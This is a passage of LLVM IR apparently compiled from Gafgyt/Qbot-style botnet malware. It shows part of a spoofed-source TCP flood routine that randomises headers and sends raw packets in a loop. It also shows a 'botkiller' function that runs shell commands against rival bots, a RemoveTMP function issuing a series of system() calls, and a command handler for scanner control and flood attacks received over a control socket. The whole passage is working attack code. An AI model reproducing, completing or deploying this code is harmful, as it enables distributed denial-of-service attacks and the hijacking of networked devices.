  %159 = load i8*, i8** %23, align 8
  %160 = icmp ne i8* %159, null
  br i1 %160, label %161, label %231

; <label>:161:                                    ; preds = %158
  %162 = load i8*, i8** %23, align 8
  %163 = call i32 @strcmp(i8* %162, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.418, i32 0, i32 0)) #10
  %164 = icmp ne i32 %163, 0
  br i1 %164, label %173, label %165

; <label>:165:                                    ; preds = %161
  %166 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %167 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %166, i32 0, i32 0
  %168 = bitcast %union.anon.0* %167 to %struct.anon.1*
  %169 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %168, i32 0, i32 4
  %170 = load i16, i16* %169, align 4
  %171 = and i16 %170, -513
  %172 = or i16 %171, 512
  store i16 %172, i16* %169, align 4
  br label %229

; <label>:173:                                    ; preds = %161
  %174 = load i8*, i8** %23, align 8
  %175 = call i32 @strcmp(i8* %174, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.419, i32 0, i32 0)) #10
  %176 = icmp ne i32 %175, 0
  br i1 %176, label %185, label %177

; <label>:177:                                    ; preds = %173
  %178 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %179 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %178, i32 0, i32 0
  %180 = bitcast %union.anon.0* %179 to %struct.anon.1*
  %181 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %180, i32 0, i32 4
  %182 = load i16, i16* %181, align 4
  %183 = and i16 %182, -1025
  %184 = or i16 %183, 1024
  store i16 %184, i16* %181, align 4
  br label %228

; <label>:185:                                    ; preds = %173
  %186 = load i8*, i8** %23, align 8
  %187 = call i32 @strcmp(i8* %186, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.420, i32 0, i32 0)) #10
  %188 = icmp ne i32 %187, 0
  br i1 %188, label %197, label %189

; <label>:189:                                    ; preds = %185
  %190 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 0
  %192 = bitcast %union.anon.0* %191 to %struct.anon.1*
  %193 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -257
  %196 = or i16 %195, 256
  store i16 %196, i16* %193, align 4
  br label %227

; <label>:197:                                    ; preds = %185
  %198 = load i8*, i8** %23, align 8
  %199 = call i32 @strcmp(i8* %198, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.421, i32 0, i32 0)) #10
  %200 = icmp ne i32 %199, 0
  br i1 %200, label %209, label %201

; <label>:201:                                    ; preds = %197
  %202 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 0
  %204 = bitcast %union.anon.0* %203 to %struct.anon.1*
  %205 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = and i16 %206, -4097
  %208 = or i16 %207, 4096
  store i16 %208, i16* %205, align 4
  br label %226

; <label>:209:                                    ; preds = %197
  %210 = load i8*, i8** %23, align 8
  %211 = call i32 @strcmp(i8* %210, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.422, i32 0, i32 0)) #10
  %212 = icmp ne i32 %211, 0
  br i1 %212, label %221, label %213

; <label>:213:                                    ; preds = %209
  %214 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 0
  %216 = bitcast %union.anon.0* %215 to %struct.anon.1*
  %217 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = and i16 %218, -2049
  %220 = or i16 %219, 2048
  store i16 %220, i16* %217, align 4
  br label %225

; <label>:221:                                    ; preds = %209
  %222 = load i32, i32* @mainCommSock, align 4
  %223 = load i8*, i8** %23, align 8
  %224 = call i32 (i32, i8*, ...) @sockprintf(i32 %222, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.423, i32 0, i32 0), i8* %223)
  br label %225

; <label>:225:                                    ; preds = %221, %213
  br label %226

; <label>:226:                                    ; preds = %225, %201
  br label %227

; <label>:227:                                    ; preds = %226, %189
  br label %228

; <label>:228:                                    ; preds = %227, %177
  br label %229

; <label>:229:                                    ; preds = %228, %165
  %230 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %230, i8** %23, align 8
  br label %158

; <label>:231:                                    ; preds = %158
  br label %232

; <label>:232:                                    ; preds = %231, %119
  %233 = call i32 @rand_cmwc()
  %234 = trunc i32 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 0
  %237 = bitcast %union.anon.0* %236 to %struct.anon.1*
  %238 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %237, i32 0, i32 5
  store i16 %234, i16* %238, align 2
  %239 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %240 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %239, i32 0, i32 0
  %241 = bitcast %union.anon.0* %240 to %struct.anon.1*
  %242 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %241, i32 0, i32 6
  store i16 0, i16* %242, align 4
  %243 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %244 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %243, i32 0, i32 0
  %245 = bitcast %union.anon.0* %244 to %struct.anon.1*
  %246 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %245, i32 0, i32 7
  store i16 0, i16* %246, align 2
  %247 = load i32, i32* %9, align 4
  %248 = icmp eq i32 %247, 0
  br i1 %248, label %249, label %251

; <label>:249:                                    ; preds = %232
  %250 = call i32 @rand_cmwc()
  br label %256

; <label>:251:                                    ; preds = %232
  %252 = load i32, i32* %9, align 4
  %253 = trunc i32 %252 to i16
  %254 = call zeroext i16 @htons(i16 zeroext %253) #13
  %255 = zext i16 %254 to i32
  br label %256

; <label>:256:                                    ; preds = %251, %249
  %257 = phi i32 [ %250, %249 ], [ %255, %251 ]
  %258 = trunc i32 %257 to i16
  %259 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 0
  %261 = bitcast %union.anon.0* %260 to %struct.anon.1*
  %262 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %261, i32 0, i32 1
  store i16 %258, i16* %262, align 2
  %263 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %264 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %265 = call zeroext i16 @tcpcsum(%struct.iphdr* %263, %struct.tcphdr* %264)
  %266 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 0
  %268 = bitcast %union.anon.0* %267 to %struct.anon.1*
  %269 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %268, i32 0, i32 6
  store i16 %265, i16* %269, align 4
  %270 = bitcast i8* %77 to i16*
  %271 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 2
  %273 = load i16, i16* %272, align 2
  %274 = zext i16 %273 to i32
  %275 = call zeroext i16 @csum(i16* %270, i32 %274)
  %276 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 7
  store i16 %275, i16* %277, align 2
  %278 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %279 = load i32, i32* %10, align 4
  %280 = add nsw i32 %278, %279
  store i32 %280, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %281

; <label>:281:                                    ; preds = %334, %333, %256
  br label %282

; <label>:282:                                    ; preds = %281
  %283 = load i32, i32* %17, align 4
  %284 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %285 = call i64 @sendto(i32 %283, i8* %77, i64 %75, i32 0, %struct.sockaddr* %284, i32 16)
  %286 = load i32, i32* %19, align 4
  %287 = call i32 @getRandomIP(i32 %286)
  %288 = call i32 @htonl(i32 %287) #13
  %289 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 8
  store i32 %288, i32* %290, align 4
  %291 = call i32 @rand_cmwc()
  %292 = trunc i32 %291 to i16
  %293 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %294 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %293, i32 0, i32 3
  store i16 %292, i16* %294, align 4
  %295 = call i32 @rand_cmwc()
  %296 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %297 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %296, i32 0, i32 0
  %298 = bitcast %union.anon.0* %297 to %struct.anon.1*
  %299 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %298, i32 0, i32 2
  store i32 %295, i32* %299, align 4
  %300 = call i32 @rand_cmwc()
  %301 = trunc i32 %300 to i16
  %302 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i32 0, i32 0
  %304 = bitcast %union.anon.0* %303 to %struct.anon.1*
  %305 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %304, i32 0, i32 0
  store i16 %301, i16* %305, align 4
  %306 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %307 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %306, i32 0, i32 0
  %308 = bitcast %union.anon.0* %307 to %struct.anon.1*
  %309 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %308, i32 0, i32 6
  store i16 0, i16* %309, align 4
  %310 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %311 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %312 = call zeroext i16 @tcpcsum(%struct.iphdr* %310, %struct.tcphdr* %311)
  %313 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %314 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %313, i32 0, i32 0
  %315 = bitcast %union.anon.0* %314 to %struct.anon.1*
  %316 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %315, i32 0, i32 6
  store i16 %312, i16* %316, align 4
  %317 = bitcast i8* %77 to i16*
  %318 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %319 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %318, i32 0, i32 2
  %320 = load i16, i16* %319, align 2
  %321 = zext i16 %320 to i32
  %322 = call zeroext i16 @csum(i16* %317, i32 %321)
  %323 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 7
  store i16 %322, i16* %324, align 2
  %325 = load i32, i32* %25, align 4
  %326 = load i32, i32* %15, align 4
  %327 = icmp eq i32 %325, %326
  br i1 %327, label %328, label %334

; <label>:328:                                    ; preds = %282
  %329 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %330 = load i32, i32* %24, align 4
  %331 = icmp sgt i32 %329, %330
  br i1 %331, label %332, label %333

; <label>:332:                                    ; preds = %328
  br label %337

; <label>:333:                                    ; preds = %328
  store i32 0, i32* %25, align 4
  br label %281

; <label>:334:                                    ; preds = %282
  %335 = load i32, i32* %25, align 4
  %336 = add i32 %335, 1
  store i32 %336, i32* %25, align 4
  br label %281

; <label>:337:                                    ; preds = %332
  %338 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %338)
  br label %339

; <label>:339:                                    ; preds = %337, %59, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @botkiller() #0 {
  %1 = alloca [10 x i8*], align 16
  %2 = alloca [23 x i8*], align 16
  %3 = alloca [16 x i8*], align 16
  %4 = alloca [80 x i8], align 16
  %5 = alloca [80 x i8], align 16
  %6 = alloca [128 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = bitcast [10 x i8*]* %1 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %10, i8* bitcast ([10 x i8*]* @botkiller.teldirs to i8*), i64 80, i32 16, i1 false)
  %11 = bitcast [23 x i8*]* %2 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %11, i8* bitcast ([23 x i8*]* @botkiller.Boats to i8*), i64 184, i32 16, i1 false)
  %12 = bitcast [16 x i8*]* %3 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %12, i8* bitcast ([16 x i8*]* @botkiller.bots to i8*), i64 128, i32 16, i1 false)
  store i32 0, i32* %9, align 4
  br label %13

; <label>:13:                                     ; preds = %70, %0
  %14 = load i32, i32* %9, align 4
  %15 = load i32, i32* %8, align 4
  %16 = icmp slt i32 %14, %15
  br i1 %16, label %17, label %73

; <label>:17:                                     ; preds = %13
  %18 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 128, i32 16, i1 false)
  %19 = load i32, i32* %9, align 4
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %44

; <label>:21:                                     ; preds = %17
  %22 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i32 0, i32 0
  %23 = load i32, i32* %9, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = load i32, i32* %9, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = load i32, i32* %9, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %32
  %34 = load i8*, i8** %33, align 8
  %35 = load i32, i32* %9, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %36
  %38 = load i8*, i8** %37, align 8
  %39 = load i32, i32* %9, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds [16 x i8*], [16 x i8*]* %3, i64 0, i64 %40
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %22, i64 127, i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.455, i32 0, i32 0), i8* %26, i8* %30, i8* %34, i8* %38, i8* %42) #5
  br label %59

; <label>:44:                                     ; preds = %17
  %45 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i32 0, i32 0
  %46 = load i32, i32* %9, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %47
  %49 = load i8*, i8** %48, align 8
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %51
  %53 = load i8*, i8** %52, align 8
  %54 = load i32, i32* %9, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %55
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %45, i64 127, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.456, i32 0, i32 0), i8* %49, i8* %53, i8* %57) #5
  br label %59

; <label>:59:                                     ; preds = %44, %21
  %60 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i32 0, i32 0
  %61 = call i32 @system(i8* %60)
  %62 = getelementptr inbounds [80 x i8], [80 x i8]* %5, i32 0, i32 0
  %63 = load i32, i32* %9, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds [16 x i8*], [16 x i8*]* %3, i64 0, i64 %64
  %66 = load i8*, i8** %65, align 8
  %67 = call i32 (i8*, i8*, ...) @sprintf(i8* %62, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.457, i32 0, i32 0), i8* %66) #5
  %68 = getelementptr inbounds [80 x i8], [80 x i8]* %5, i32 0, i32 0
  %69 = call i32 @system(i8* %68)
  br label %75
                                                  ; No predecessors!
  %71 = load i32, i32* %9, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %9, align 4
  br label %13

; <label>:73:                                     ; preds = %13
  %74 = call i32 @sleep(i32 5)
  br label %75

; <label>:75:                                     ; preds = %73, %59
  ret void
}

; Function Attrs: nounwind
declare i32 @snprintf(i8*, i64, i8*, ...) #2

declare i32 @system(i8*) #4

declare i32 @sleep(i32) #4

; Function Attrs: noinline nounwind uwtable
define void @RemoveTMP() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.458, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.459, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.460, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.459, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.461, i32 0, i32 0))
  %6 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.462, i32 0, i32 0))
  %7 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.463, i32 0, i32 0))
  %8 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.464, i32 0, i32 0))
  %9 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.465, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.466, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.467, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.468, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.469, i32 0, i32 0))
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %31 = load i8**, i8*** %4, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @strcmp(i8* %33, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0)) #10
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %39, label %36

; <label>:36:                                     ; preds = %2
  %37 = load i32, i32* @mainCommSock, align 4
  %38 = call i32 (i32, i8*, ...) @sockprintf(i32 %37, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.470, i32 0, i32 0))
  br label %577

; <label>:39:                                     ; preds = %2
  %40 = load i8**, i8*** %4, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 0
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 @strcmp(i8* %42, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.471, i32 0, i32 0)) #10
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %50, label %45

; <label>:45:                                     ; preds = %39
  %46 = load i32, i32* @mainCommSock, align 4
  %47 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %48 = call i8* @inet_ntoa(i32 %47) #5
  %49 = call i32 (i32, i8*, ...) @sockprintf(i32 %46, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.472, i32 0, i32 0), i8* %48)
  br label %577

; <label>:50:                                     ; preds = %39
  %51 = load i8**, i8*** %4, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 0
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @strcmp(i8* %53, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.473, i32 0, i32 0)) #10
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %65, label %56

; <label>:56:                                     ; preds = %50
  %57 = call i32 @listFork()
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %64, label %59

; <label>:59:                                     ; preds = %56
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %62 = call i8* @inet_ntoa(i32 %61) #5
  %63 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.474, i32 0, i32 0), i8* %62)
  call void @botkiller()
  call void @RemoveTMP()
  call void @_exit(i32 0) #12
  unreachable

; <label>:64:                                     ; preds = %56
  br label %65

; <label>:65:                                     ; preds = %64, %50
  %66 = load i8**, i8*** %4, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 0
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @strcmp(i8* %68, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.475, i32 0, i32 0)) #10
  %70 = icmp ne i32 %69, 0
  br i1 %70, label %109, label %71

; <label>:71:                                     ; preds = %65
  %72 = load i8**, i8*** %4, align 8
  %73 = getelementptr inbounds i8*, i8** %72, i64 1
  %74 = load i8*, i8** %73, align 8
  %75 = call i32 @strcmp(i8* %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.476, i32 0, i32 0)) #10
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %84, label %77

; <label>:77:                                     ; preds = %71
  %78 = load i32, i32* @scanPid, align 4
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %80, label %81

; <label>:80:                                     ; preds = %77
  br label %577

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* @scanPid, align 4
  %83 = call i32 @kill(i32 %82, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  br label %84

; <label>:84:                                     ; preds = %81, %71
  %85 = load i8**, i8*** %4, align 8
  %86 = getelementptr inbounds i8*, i8** %85, i64 1
  %87 = load i8*, i8** %86, align 8
  %88 = call i32 @strcmp(i8* %87, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.477, i32 0, i32 0)) #10
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %108, label %90

; <label>:90:                                     ; preds = %84
  %91 = load i32, i32* @scanPid, align 4
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %94

; <label>:93:                                     ; preds = %90
  br label %577

; <label>:94:                                     ; preds = %90
  %95 = call i32 @fork() #5
  store i32 %95, i32* %6, align 4
  store i32 400, i32* %7, align 4
  store i32 7, i32* %8, align 4
  %96 = load i32, i32* %6, align 4
  %97 = icmp ugt i32 %96, 0
  br i1 %97, label %98, label %100

; <label>:98:                                     ; preds = %94
  %99 = load i32, i32* %6, align 4
  store i32 %99, i32* @scanPid, align 4
  br label %577

; <label>:100:                                    ; preds = %94
  %101 = load i32, i32* %6, align 4
  %102 = icmp eq i32 %101, -1
  br i1 %102, label %103, label %104

; <label>:103:                                    ; preds = %100
  br label %577

; <label>:104:                                    ; preds = %100
  br label %105

; <label>:105:                                    ; preds = %104
  %106 = load i32, i32* %8, align 4
  %107 = load i32, i32* %7, align 4
  call void (i32, i32, ...) bitcast (void ()* @StartTheLelz to void (i32, i32, ...)*)(i32 %106, i32 %107)
  call void @_exit(i32 0) #12
  unreachable

; <label>:108:                                    ; preds = %84
  br label %109

; <label>:109:                                    ; preds = %108, %65
  %110 = load i8**, i8*** %4, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 0
  %112 = load i8*, i8** %111, align 8
  %113 = call i32 @strcmp(i8* %112, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.478, i32 0, i32 0)) #10
  %114 = icmp ne i32 %113, 0
  br i1 %114, label %228, label %115

; <label>:115:                                    ; preds = %109
  %116 = load i32, i32* %3, align 4
  %117 = icmp slt i32 %116, 6
  br i1 %117, label %163, label %118

; <label>:118:                                    ; preds = %115
  %119 = load i8**, i8*** %4, align 8
  %120 = getelementptr inbounds i8*, i8** %119, i64 3
  %121 = load i8*, i8** %120, align 8
  %122 = call i32 @atoi(i8* %121) #10
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %163, label %124

; <label>:124:                                    ; preds = %118
  %125 = load i8**, i8*** %4, align 8
  %126 = getelementptr inbounds i8*, i8** %125, i64 2
  %127 = load i8*, i8** %126, align 8
  %128 = call i32 @atoi(i8* %127) #10
  %129 = icmp eq i32 %128, -1
  br i1 %129, label %163, label %130

; <label>:130:                                    ; preds = %124
  %131 = load i8**, i8*** %4, align 8
  %132 = getelementptr inbounds i8*, i8** %131, i64 4
  %133 = load i8*, i8** %132, align 8
  %134 = call i32 @atoi(i8* %133) #10
  %135 = icmp eq i32 %134, -1
  br i1 %135, label %163, label %136

; <label>:136:                                    ; preds = %130
  %137 = load i8**, i8*** %4, align 8
  %138 = getelementptr inbounds i8*, i8** %137, i64 5
  %139 = load i8*, i8** %138, align 8
  %140 = call i32 @atoi(i8* %139) #10
  %141 = icmp eq i32 %140, -1
  br i1 %141, label %163, label %142

; <label>:142:                                    ; preds = %136
  %143 = load i8**, i8*** %4, align 8
  %144 = getelementptr inbounds i8*, i8** %143, i64 5
  %145 = load i8*, i8** %144, align 8
  %146 = call i32 @atoi(i8* %145) #10
  %147 = icmp sgt i32 %146, 65500
  br i1 %147, label %163, label %148

; <label>:148:                                    ; preds = %142
  %149 = load i8**, i8*** %4, align 8
  %150 = getelementptr inbounds i8*, i8** %149, i64 4
  %151 = load i8*, i8** %150, align 8
  %152 = call i32 @atoi(i8* %151) #10
  %153 = icmp sgt i32 %152, 32
  br i1 %153, label %163, label %154

; <label>:154:                                    ; preds = %148
  %155 = load i32, i32* %3, align 4
  %156 = icmp eq i32 %155, 7
  br i1 %156, label %157, label %164

; <label>:157:                                    ; preds = %154
  %158 = load i8**, i8*** %4, align 8
  %159 = getelementptr inbounds i8*, i8** %158, i64 6
  %160 = load i8*, i8** %159, align 8
  %161 = call i32 @atoi(i8* %160) #10
  %162 = icmp slt i32 %161, 1
  br i1 %162, label %163, label %164

; <label>:163:                                    ; preds = %157, %148, %142, %136, %130, %124, %118, %115
  br label %577

; <label>:164:                                    ; preds = %157, %154
  %165 = load i8**, i8*** %4, align 8
  %166 = getelementptr inbounds i8*, i8** %165, i64 1
  %167 = load i8*, i8** %166, align 8
  store i8* %167, i8** %9, align 8
  %168 = load i8**, i8*** %4, align 8
  %169 = getelementptr inbounds i8*, i8** %168, i64 2
  %170 = load i8*, i8** %169, align 8
  %171 = call i32 @atoi(i8* %170) #10
  store i32 %171, i32* %10, align 4
  %172 = load i8**, i8*** %4, align 8
  %173 = getelementptr inbounds i8*, i8** %172, i64 3
  %174 = load i8*, i8** %173, align 8
  %175 = call i32 @atoi(i8* %174) #10
  store i32 %175, i32* %11, align 4
  %176 = load i8**, i8*** %4, align 8
  %177 = getelementptr inbounds i8*, i8** %176, i64 4
  %178 = load i8*, i8** %177, align 8
  %179 = call i32 @atoi(i8* %178) #10
  store i32 %179, i32* %12, align 4
  %180 = load i8**, i8*** %4, align 8
  %181 = getelementptr inbounds i8*, i8** %180, i64 5
  %182 = load i8*, i8** %181, align 8
  %183 = call i32 @atoi(i8* %182) #10
  store i32 %183, i32* %13, align 4
  %184 = load i32, i32* %3, align 4
  %185 = icmp eq i32 %184, 7
  br i1 %185, label %186, label %191

; <label>:186:                                    ; preds = %164
  %187 = load i8**, i8*** %4, align 8
  %188 = getelementptr inbounds i8*, i8** %187, i64 6
  %189 = load i8*, i8** %188, align 8
  %190 = call i32 @atoi(i8* %189) #10
  br label %192

; <label>:191:                                    ; preds = %164
  br label %192

; <label>:192:                                    ; preds = %191, %186
  %193 = phi i32 [ %190, %186 ], [ 10, %191 ]
  store i32 %193, i32* %14, align 4
  %194 = load i8*, i8** %9, align 8
  %195 = call i8* @strstr(i8* %194, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #10
  %196 = icmp ne i8* %195, null
  br i1 %196, label %197, label %216

